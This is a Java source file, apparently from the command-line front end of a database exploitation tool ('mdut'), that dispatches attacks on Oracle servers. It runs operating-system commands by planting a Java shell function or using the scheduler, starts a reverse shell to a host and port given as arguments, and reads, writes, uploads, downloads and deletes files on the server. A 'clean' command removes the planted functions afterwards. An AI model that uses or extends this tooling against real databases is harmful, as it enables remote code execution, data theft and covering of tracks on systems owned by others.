package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.OracleDao;
import Util.OracleSqlUtil;
import Util.Utils;
import org.json.JSONObject;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Map;

/**
 * Oracle 分发：info / exec（java|scheduler + ShellUtil 自动导入）/ sql / clean / revshell
 * + 文件五件套与 upload/download（FileUtil：readfile 回 hex、writefile 收 hex）。
 */
public class OracleDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "oracle";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        OracleDao dao = new OracleDao(rec.get("ipaddress"), rec.get("port"), rec.get("database"),
                rec.get("username"), rec.get("password"), String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);
        dao.getConnection();

        if ("sql".equals(tool)) {
            return Result.ok(nz(dao.executeSql(p.positionals.get(0)))).withId(id);
        }
        if ("info".equals(tool)) {
            dao.getVersion();
            boolean dba = dao.queryIsDba();
            JSONObject d = new JSONObject();
            d.put("version", "见 stderr 明细（banner）");
            d.put("is_dba", dba);
            d.put("os", nz(dao.getOs()));
            return Result.ok("Oracle / " + (dba ? "DBA" : "非DBA") + " / " + nz(dao.getOs()), d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            String method = flag(p, "method", "java");
            if ("java".equals(method)) {
                ensureShellUtil(dao);
                String res = dao.executeCommand(cmd, code, "java");
                return Result.ok(nz(res)).withId(id);
            }
            if ("scheduler".equals(method)) {
                String res = dao.executeCommand(cmd, code, "scheduler");
                return Result.ok(nz(res)).withId(id);
            }
            return Result.usage("未知 --method: " + method, "可用: java|scheduler").withId(id);
        }
        if ("clean".equals(tool)) {
            dao.deleteShellFunction();
            dao.deleteFileFunction();
            return Result.ok("clean 完成（SHELLRUN/FILERUN 及 Java Source 删除）").withId(id);
        }
        if ("revshell".equals(tool)) {
            ensureShellUtil(dao);
            dao.reverseJavaShell(p.positionals.get(0), p.positionals.get(1));
            return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
        }
        if ("list-files".equals(tool)) {
            java.util.ArrayList<String> files = dao.getFiles(p.positionals.get(0), code);
            org.json.JSONArray arr = new org.json.JSONArray();
            for (String f : files) {
                arr.put(f);
            }
            JSONObject d = new JSONObject();
            d.put("files", arr);
            return Result.ok(MssqlDispatcher.joinLines(files), d).withId(id);
        }
        if ("read".equals(tool)) {
            String hex = dao.download(p.positionals.get(0));
            byte[] bytes = decodeHex(hex);
            if (bytes == null) {
                return Result.target("读取失败: " + hex, "检查路径/权限；错误详情见 stderr").withId(id);
            }
            return Result.ok(new String(bytes, code),
                    new JSONObject().put("b64", java.util.Base64.getEncoder().encodeToString(bytes))
                            .put("size", bytes.length)).withId(id);
        }
        if ("write".equals(tool)) {
            byte[] content = MssqlDispatcher.readContent(p);
            dao.upload(p.positionals.get(0), Utils.bytes2HexString(content));
            return Result.ok("写入完成: " + p.positionals.get(0) + " (" + content.length + " bytes)").withId(id);
        }
        if ("upload".equals(tool)) {
            byte[] bytes = Utils.toByteArray(p.positionals.get(0));
            if (bytes == null) {
                return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
            }
            dao.upload(p.positionals.get(1), Utils.bytes2HexString(bytes));
            return Result.ok("上传完成: " + p.positionals.get(0) + " → " + p.positionals.get(1)
                    + " (" + bytes.length + " bytes)").withId(id);
        }
        if ("download".equals(tool)) {
            String hex = dao.download(p.positionals.get(0));
            byte[] bytes = decodeHex(hex);
            if (bytes == null) {
                return Result.target("下载失败: " + hex, "检查路径/权限；错误详情见 stderr").withId(id);
            }
            return MssqlDispatcher.toOut(ctx, new String(bytes, StandardCharsets.UTF_8), bytes, flag(p, "out", "")).withId(id);
        }
        if ("rm".equals(tool)) {
            String res = dao.delete(p.positionals.get(0));
            if (res != null && res.contains("ERROR://")) {
                return Result.target("删除失败: " + res.replace("ERROR://", "").trim(), "检查路径/权限").withId(id);
            }
            return Result.ok("删除完成: " + p.positionals.get(0)).withId(id);
        }
        if ("mkdir".equals(tool)) {
            return Result.usage("oracle 文件插件（FileUtil）无 mkdir 能力",
                    "替代: exec --method java 'mkdir -p <path>'").withId(id);
        }
        return Result.usage("oracle 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    private void ensureShellUtil(OracleDao dao) throws Exception {
        String exists = dao.executeSql(OracleSqlUtil.checkShellFunctionSql);
        if (exists == null || exists.replace("\n", "").isEmpty()) {
            dao.importShellUtilJAVA();
        }
    }

    private static byte[] decodeHex(String hex) {
        if (hex == null || hex.isEmpty() || hex.contains("ERROR://")) {
            return null;
        }
        try {
            return Utils.hexToByte(hex.trim());
        } catch (Exception e) {
            return null;
        }
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
